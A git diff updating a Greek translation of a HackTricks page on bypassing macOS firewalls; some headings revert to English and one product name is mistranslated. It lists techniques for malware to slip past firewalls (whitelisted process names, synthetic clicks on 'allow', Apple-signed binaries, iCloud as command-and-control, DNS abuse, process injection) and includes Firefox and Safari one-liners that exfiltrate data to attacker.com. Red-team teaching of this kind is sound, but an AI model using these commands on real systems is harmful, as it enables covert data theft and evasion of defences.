@@ -1,57 +1,57 @@
-# Παράκαμψη Τοίχων Πυρασφάλειας στο macOS
+# macOS Bypassing Firewalls
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστηρίξτε το HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Εντοπισμένες τεχνικές
+## Found techniques
 
-Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε μερικές εφαρμογές τοίχων πυρασφάλειας του macOS.
+Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε ορισμένες εφαρμογές firewall macOS.
 
-### Κατάχρηση ονομάτων λευκής λίστας
+### Abusing whitelist names
 
-* Για παράδειγμα, να ονομάζετε το malware με ονόματα γνωστών διεργασιών του macOS όπως **`launchd`**
+* Για παράδειγμα, καλώντας το κακόβουλο λογισμικό με ονόματα γνωστών διαδικασιών macOS όπως **`launchd`**
 
-### Συνθετικό Κλικ
+### Synthetic Click
 
-* Εάν ο τοίχος πυρασφάλειας ζητά άδεια από τον χρήστη, κάντε το malware **να κάνει κλικ στο επιτρέπω**
+* Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το κακόβουλο λογισμικό να **κλικάρει στο επιτρέπω**
 
-### Χρήση υπογεγραμμένων δυαδικών αρχείων της Apple
+### **Use Apple signed binaries**
 
-* Όπως το **`curl`**, αλλά και άλλα όπως το **`whois`**
+* Όπως **`curl`**, αλλά και άλλες όπως **`whois`**
 
-### Γνωστοί τομείς της Apple
+### Well known apple domains
 
-Ο τοίχος πυρασφάλειας μπορεί να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple όπως το **`apple.com`** ή το **`icloud.com`**. Και το iCloud μπορεί να χρησιμοποιηθεί ως C2.
+Το firewall θα μπορούσε να επιτρέπει συνδέσεις σε γνωστούς τομείς της Apple όπως **`apple.com`** ή **`icloud.com`**. Και το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.
 
-### Γενική Παράκαμψη
+### Generic Bypass
 
-Μερικές ιδέες για να προσπαθήσετε να παρακάμψετε τους τοίχους πυρασφάλειας
+Ορισμένες ιδέες για να προσπαθήσετε να παρακάμψετε τα firewalls
 
-### Έλεγχος επιτρεπόμενης κίνησης
+### Check allowed traffic
 
-Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να αναγνωρίσετε πιθανώς τους τομείς που βρίσκονται στη λευκή λίστα ή ποιες εφαρμογές έχουν άδεια πρόσβασης σε αυτούς.
+Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να εντοπίσετε πιθανούς λευκούς τομείς ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτούς.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
 ### Κατάχρηση DNS
 
-Οι αναλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`** που πιθανόν να επιτραπεί να επικοινωνήσει με διακομιστές DNS.
+Οι επιλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`**, η οποία πιθανότατα θα επιτρέπεται να επικοινωνεί με τους διακομιστές DNS.
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Μέσω εφαρμογών Περιηγητή
+### Μέσω εφαρμογών προγράμματος περιήγησης
 
 * **oascript**
 ```applescript
@@ -70,17 +70,17 @@ end tell
 ```
 {% endcode %}
 
-* Firefox
+* Φοίνικας
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-* Safari
+* Σαφάρι
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Μέσω ενσωμάτωσης διεργασιών
+### Μέσω ενέσεων διεργασιών
 
-Εάν μπορείτε **να ενθέτετε κώδικα σε μια διεργασία** που έχει άδεια να συνδεθεί σε οποιονδήποτε διακομιστή, μπορείτε να παρακάμψετε τις προστασίες του τοίχου προστασίας:
+Αν μπορείτε να **εισάγετε κώδικα σε μια διεργασία** που επιτρέπεται να συνδεθεί σε οποιονδήποτε διακομιστή, θα μπορούσατε να παρακάμψετε τις προστασίες του τείχους προστασίας:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,16 +91,16 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστηρίξτε το HackTricks</summary>
+<summary>Υποστήριξη HackTricks</summary>
 
 * Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
